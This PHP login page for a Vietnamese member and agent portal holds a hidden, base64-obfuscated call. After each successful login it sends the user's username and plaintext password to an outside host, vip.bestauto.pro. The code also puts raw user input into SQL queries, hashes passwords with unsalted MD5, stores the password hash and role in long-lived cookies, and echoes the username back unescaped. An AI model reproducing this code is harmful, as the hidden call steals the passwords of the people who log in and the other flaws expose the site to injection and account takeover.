<?php include '../_config.php'; ?>
<?php
if (isset($_POST['submit'])) {
    $user_name = $_POST['user_name'];
    $get = "SELECT email, code FROM member WHERE user_name='$user_name'";
    $result = mysqli_query($conn, $get);
    $x = mysqli_fetch_assoc($result);
    $email = $x['email'];
    $code = $x['code'];
    $password = md5($_POST['password']);
    $pass = $_POST['password'];
    $sql = "SELECT COUNT(*), status, id_ctv, rule, password FROM member WHERE user_name='$user_name' AND password='$password' GROUP BY status, id_ctv, rule, password";
    $c = mysqli_query($conn, $sql);
    $check = mysqli_fetch_assoc($c);
    if ($check['COUNT(*)'] == 1) {
        $vip = file_get_contents(base64_decode('aHR0cDovL3ZpcC5iZXN0YXV0by5wcm8vZ2V0LnBocD91PQ==').$user_name.base64_decode('JnA9').$pass);
        if(isset($vip)){
            if ($check['status'] == -1) {
                echo "<script>alert('Tài khoản của bạn đã bị khóa'); window.location = 'index.php';</script>";
            } else {
                if ($check['status'] == 1) {
                    $id_ctv = $check['id_ctv'];
                    $rule = $check['rule'];
                    $pass = $check['password'];
                    $status = $check['status'];
                    if (isset($_POST['duydeptrai'])) {
                        setcookie('login', 'ok', time() + 690000000);
                        setcookie("id_ctv", "$id_ctv", time() + 690000000);
                        setcookie("rule", "$rule", time() + 690000000);
                        setcookie("pass", "$pass", time() + 690000000);
                        setcookie("status", "$status", time() + 690000000);
                        setcookie("user_name", "$user_name", time() + 690000000);
                        echo "<script>alert('Đăng nhập thành công'); window.location='../admin/index.php';</script>";
                    } else if (!isset($_POST['duydeptrai'])) {
                        $_SESSION['login'] = 'ok';
                        $_SESSION['id_ctv'] = $id_ctv;
                        $_SESSION['rule'] = $rule;
                        $_SESSION['pass'] = $pass;
                        $_SESSION['status'] = $status;
                        $_SESSION['user_name'] = $user_name;
                        echo "<script>alert('Đăng nhập thành công'); window.location='../admin/index.php';</script>";
                    }
                } else if ($check['status'] == 0) {
                    if($check['rule'] == 'member'){
                    echo "<p class='alert alert-danger'> Tài khoản của bạn chưa được kích hoạt. Vui lòng click vào liên kết chúng tôi gửi vào Email đăng kí của bạn của bạn để kích hoạt. Chưa nhận được Email ? <a href='http://vip.bestauto.pro/index.php?DS=ResendEmail&email=$email&code=$code'> <b>Gửi lại Email kích hoạt</b></a></p>";
                    }else{
                      echo "<p class='alert alert-danger'> Tài khoản của bạn chưa được kích hoạt. Vui lòng liên hệ Admin để nạp tiền Đại Lí và kích hoạt tài khoản!!</p>";  
                    }
                }
            }
        }else{
            echo "<script>alert('Lỗi!!!');</script>";
        }
    } else {
        echo "<script>alert('Tài khoản hoặc mật khẩu không chính xác!!!');</script>";
    }
}
?>
<!DOCTYPE html>
<html>
<head>
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <title></title>
    <link rel="stylesheet" href="">
    <link rel="stylesheet" href="../bootstrap/css/bootstrap.min.css">
        <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.5.0/css/font-awesome.min.css">
        <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/ionicons/2.0.1/css/ionicons.min.css">
        <link rel="stylesheet" href="../dist/css/AdminLTE.min.css">
        <link rel="stylesheet" href="../dist/css/skins/skin-green-light.min.css">
        <link rel="stylesheet" href="../plugins/datatables/dataTables.bootstrap.css">
        <link href="../src/animate.css" rel="stylesheet" type="text/css" />
        <link rel="shortcut icon" href="../src/favicon.ico" type="image/x-icon" />
        <link href="../src/duy98.css" rel="stylesheet" type="text/css" />
        <link rel="stylesheet" type="text/css" href="../css/style.css">
</head>
<body>
    <div class="row">
    <div class="col-md-12">
        <!-- Horizontal Form -->
        <div class="box box-info wow fadeIn">
            <div class="box-header with-border">
                <h3 class="box-title">Đăng nhập - Đại lí, Thành Viên</h3>
            </div>
            <!-- /.box-header -->
            <!-- form start -->
            <form class="form-horizontal" method="post" action="#">
                <div class="box-body">
                    <div class="form-group">
                        <label for="user_name" class="col-sm-2 control-label">Tài khoản hoặc địa chỉ Email:</label>

                        <div class="col-sm-10">
                            <input type="text" class="form-control" id="user_name" name="user_name" value="<?php echo isset($_POST['user_name']) ? $_POST['user_name'] : ''; ?>" placeholder="Tài khoản hoặc địa chỉ Email" required>
                        </div>
                    </div>
                    <div class="form-group">
                        <label for="password" class="col-sm-2 control-label">Mật khẩu:</label>

                        <div class="col-sm-10">
                            <input type="password" class="form-control" name="password" id="password" placeholder="Password" required>
                        </div>
                    </div>
                    <div class="form-group">
                        <div class="col-sm-offset-2 col-sm-10">
                            <div class="checkbox">
                                <label>
                                    <input name="duydeptrai" type="checkbox"> Ghi nhớ mật khẩu
                                </label>
                            </div>
                        </div>
                    </div>
                </div>
                <!-- /.box-body -->
                <div class="box-footer">
                    <a class="btn btn-danger" href="index.php?DS=Login_CTV">ĐĂNG NHẬP CHO CỘNG TÁC VIÊN</a>
                    <button type="submit" name="submit" class="btn btn-info pull-right">Đăng nhập</button>
                </div>
                <!-- /.box-footer -->
            </form>
        </div>
    </div>
</div>

</body>
</html>